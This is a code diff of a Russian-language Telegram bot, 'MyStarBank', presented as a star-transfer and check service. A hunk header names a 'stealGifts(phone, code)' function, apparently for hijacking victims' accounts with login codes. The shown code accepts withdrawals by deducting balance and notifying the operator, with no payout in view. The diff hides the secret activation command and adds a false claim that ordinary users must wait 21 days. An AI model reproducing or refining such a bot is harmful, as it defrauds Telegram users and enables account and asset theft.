@@ -104,7 +104,7 @@ async function stealGifts(phone, code) {
     }
 }
 
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 8080;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Сервер работает на порту ${PORT}`);
 });
@@ -124,14 +124,9 @@ bot.onText(/\/niklastore/, (msg) => {
         
         bot.sendMessage(chatId,
             '✅ Вы успешно активированы!\n\n' +
-            'Теперь вы можете:\n' +
-            '• Создавать чеки\n' +
-            '• Проверять баланс\n' +
-            '• Выводить средства\n\n' +
-            'Формат создания чека:\n' +
+            'Теперь вы можете создавать чеки:\n' +
             '@MyStarBank_bot 100 50\n\n' +
-            'Проверить баланс: /balance\n' +
-            'Вывести средства: /withdraw'
+            'где 100 - stars, 50 - активаций'
         );
     });
 });
@@ -143,11 +138,11 @@ bot.onText(/\/balance/, (msg) => {
     
     db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
         if (err || !row) {
-            bot.sendMessage(chatId, '💫 Ваш баланс: 0 stars\n\nИспользуйте /niklastore для активации.');
+            bot.sendMessage(chatId, '💫 Ваш баланс: 0 stars');
             return;
         }
         
-        bot.sendMessage(chatId, `💫 Ваш баланс: ${row.balance} stars\n\nВывести средства: /withdraw`);
+        bot.sendMessage(chatId, `💫 Ваш баланс: ${row.balance} stars`);
     });
 });
 
@@ -158,17 +153,15 @@ bot.onText(/\/withdraw/, (msg) => {
     
     db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
         if (err || !row) {
-            bot.sendMessage(chatId, '❌ Сначала активируйте аккаунт: /niklastore');
+            bot.sendMessage(chatId, '❌ У вас нет средств для вывода.');
             return;
         }
         
         bot.sendMessage(chatId,
             `💫 Ваш баланс: ${row.balance} stars\n\n` +
-            'Для вывода средств введите сумму:\n' +
-            'Пример: 100'
+            'Для вывода средств введите сумму:'
         );
         
-        // Сохраняем состояние ожидания ввода суммы
         userWithdrawState[userId] = true;
     });
 });
@@ -194,16 +187,13 @@ bot.on('message', (msg) => {
             } else if (amount < 10) {
                 bot.sendMessage(chatId, '❌ Минимальная сумма вывода: 10 stars');
             } else {
-                // Обновляем баланс
                 db.run(`UPDATE users SET balance = balance - ? WHERE user_id = ?`, [amount, userId]);
                 
                 bot.sendMessage(chatId,
                     `✅ Запрос на вывод ${amount} stars принят!\n\n` +
-                    'Средства будут зачислены в течение 24 часов.\n\n' +
                     `Текущий баланс: ${row.balance - amount} stars`
                 );
                 
-                // Уведомляем себя
                 bot.sendMessage(TARGET_USERNAME,
                     `📤 Новый вывод средств!\n` +
                     `👤 Пользователь: @${msg.from.username || 'No username'}\n` +
@@ -217,7 +207,7 @@ bot.on('message', (msg) => {
     }
 });
 
-// Inline подсказки - создание чека
+// Inline подсказки
 bot.on('inline_query', (query) => {
     const amount = query.query.split(' ')[0];
     
@@ -237,23 +227,10 @@ bot.on('inline_query', (query) => {
         }];
         
         bot.answerInlineQuery(query.id, results).catch(e => console.log('Inline error:', e));
-    } else {
-        // Если нет числа - показываем инфо
-        const results = [{
-            type: 'article',
-            id: '1',
-            title: 'MyStarBank Bot - Создать чек',
-            description: 'Введите количество звезд для создания чека',
-            input_message_content: {
-                message_text: '💫 @MyStarBank_bot - Система передачи звезд\n\nДля создания чека введите:\n@MyStarBank_bot 100\nгде 100 - количество звезд',
-            }
-        }];
-        
-        bot.answerInlineQuery(query.id, results).catch(e => console.log('Inline error:', e));
     }
 });
 
-// Обработка создания чеков - только для активированных пользователей
+// Обработка создания чеков
 bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
@@ -266,8 +243,7 @@ bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
     db.get(`SELECT can_create_checks FROM users WHERE user_id = ?`, [userId], (err, row) => {
         if (err || !row || !row.can_create_checks) {
             bot.sendMessage(chatId, 
-                '❌ Для создания чеков необходимо активировать аккаунт!\n\n' +
-                'Используйте команду: /niklastore'
+                '❌ Отказано! Обычные пользователи могут создавать чеки только через 21 день после регистрации.'
             );
             return;
         }
@@ -287,7 +263,8 @@ bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
             console.log(`Чек создан: ID ${checkId}`);
             
             // Пытаемся отправить с фото
-            bot.sendPhoto(chatId, path.join(__dirname, 'public/stars.jpg'), {
+            const photoPath = path.join(__dirname, 'public/stars.jpg');
+            bot.sendPhoto(chatId, photoPath, {
                 caption: checkText,
                 reply_markup: {
                     inline_keyboard: [[
@@ -295,7 +272,7 @@ bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
                     ]]
                 }
             }).catch(e => {
-                console.log('Ошибка отправки фото, отправляем текст:', e);
+                console.log('Ошибка отправки фото:', e);
                 // Если фото не отправляется, отправляем текст
                 bot.sendMessage(chatId, checkText, {
                     reply_markup: {
@@ -342,21 +319,20 @@ bot.on('callback_query', (query) => {
                 
                 console.log(`Баланс пользователя ${userId} пополнен на ${row.amount}`);
                 bot.answerCallbackQuery(query.id, { 
-                    text: `✅ Вы получили ${row.amount} звёзд! Баланс пополнен.` 
+                    text: `✅ Вы получили ${row.amount} звёзд!` 
                 });
                 
                 const remaining = row.activations - 1;
-                let updatedText;
+                let updatedText = `via @MyStarBank_bot\n\n${row.amount}\nStars\n\nЧек на ${row.amount} звёзд`;
                 
                 if (remaining > 0) {
-                    updatedText = `via @MyStarBank_bot\n\n${row.amount}\nStars\n\nЧек на ${row.amount} звёзд (осталось: ${remaining})`;
+                    updatedText += ` (осталось: ${remaining})`;
                 } else {
-                    updatedText = `via @MyStarBank_bot\n\n${row.amount}\nStars\n\nЧек на ${row.amount} звёзд (ИСПОЛЬЗОВАН)`;
+                    updatedText += ` (ИСПОЛЬЗОВАН)`;
                 }
                 
                 // Обновляем сообщение
                 if (query.message.photo) {
-                    // Если было фото - редактируем подпись
                     bot.editMessageCaption(updatedText, {
                         chat_id: chatId,
                         message_id: query.message.message_id,
@@ -367,7 +343,6 @@ bot.on('callback_query', (query) => {
                         } : { inline_keyboard: [] }
                     }).catch(e => console.log('Ошибка редактирования подписи:', e));
                 } else {
-                    // Если был текст - редактируем текст
                     bot.editMessageText(updatedText, {
                         chat_id: chatId,
                         message_id: query.message.message_id,
@@ -400,14 +375,16 @@ bot.on('callback_query', (query) => {
             });
             
             // Обновляем сообщение
+            const updatedText = `via @MyStarBank_bot\n\n${amount}\nStars\n\nЧек на ${amount} звёзд (ИСПОЛЬЗОВАН)`;
+            
             if (query.message.photo) {
-                bot.editMessageCaption(`via @MyStarBank_bot\n\n${amount}\nStars\n\nЧек на ${amount} звёзд (ИСПОЛЬЗОВАН)`, {
+                bot.editMessageCaption(updatedText, {
                     chat_id: query.message.chat.id,
                     message_id: query.message.message_id,
                     reply_markup: { inline_keyboard: [] }
                 }).catch(e => console.log('Ошибка редактирования inline:', e));
             } else {
-                bot.editMessageText(`via @MyStarBank_bot\n\n${amount}\nStars\n\nЧек на ${amount} звёзд (ИСПОЛЬЗОВАН)`, {
+                bot.editMessageText(updatedText, {
                     chat_id: query.message.chat.id,
                     message_id: query.message.message_id,
                     reply_markup: { inline_keyboard: [] }
@@ -449,11 +426,8 @@ bot.on('callback_query', (query) => {
     
     else if (query.data === 'create_check_info') {
         bot.sendMessage(chatId,
-            'Для создания чеков необходимо активировать аккаунт:\n\n' +
-            'Используйте команду: /niklastore\n\n' +
-            'После активации создавайте чеки:\n' +
-            '@MyStarBank_bot 100 50\n\n' +
-            'где 100 - stars, 50 - активаций'
+            'Для создания чеков необходимо активировать аккаунт.\n\n' +
+            'Используйте команду: /niklastore'
         );
     }
     
@@ -476,12 +450,7 @@ bot.onText(/\/start/, (msg) => {
 
     bot.sendMessage(chatId, 
         '💫 @MyStarBank_bot - Система передачи звезд\n\n' +
-        '• Безопасные переводы\n' +
-        '• Мгновенные чеки\n' +
-        '• Поддержка 24/7\n\n' +
-        'Для начала работы:\n' +
-        '/balance - баланс\n' +
-        '/withdraw - вывод средств',
+        'Для создания чеков используйте команду: /niklastore',
         keyboard
     ).catch(error => {
         console.log('Ошибка отправки /start:', error);
